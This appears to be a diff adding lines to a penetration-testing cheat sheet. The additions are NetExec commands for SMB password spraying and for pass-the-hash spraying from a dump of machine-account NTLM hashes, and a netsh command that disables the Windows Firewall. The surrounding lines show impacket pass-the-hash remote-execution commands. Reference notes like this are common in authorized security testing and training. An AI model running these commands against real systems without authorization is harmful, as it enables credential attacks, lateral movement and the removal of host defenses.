@@ -375,6 +375,17 @@ nxc smb <target> -u users.txt -p passwords.txt
 
 # Enumerate shares
 nxc smb <target> -u <user> -p <pass> --shares
+
+# Username = password spray — pairs each username with its matching password line.
+# --no-bruteforce stops nxc from trying every user against every pass.
+# --continue-on-success keeps spraying after the first hit.
+nxc smb <target> -u users.txt -p users.txt --no-bruteforce --continue-on-success
+
+# Pass-the-Hash bulk spray from a machine account NTLM dump.
+# Extract usernames (field 1) and NT hashes (field 4) from a colon-separated dump, then pair them.
+cut -d: -f1 hashes.txt > machine_users.txt
+cut -d: -f4 hashes.txt > machine_hashes.txt
+nxc smb <target> -u machine_users.txt -H machine_hashes.txt --no-bruteforce --continue-on-success
 ```
 
 ### NFS
@@ -907,6 +918,9 @@ accesschk.exe -kw "HKLM\System\CurrentControlSet\Services\<service>"
 impacket-psexec <domain>/<user>@<target> -hashes :<nthash>
 impacket-wmiexec <domain>/<user>@<target> -hashes :<nthash>
 impacket-smbexec <domain>/<user>@<target> -hashes :<nthash>
+
+# Disable Windows Firewall for all profiles (requires admin shell)
+netsh advfirewall set allprofiles state off
 ```
 
 ### Hash Dumping
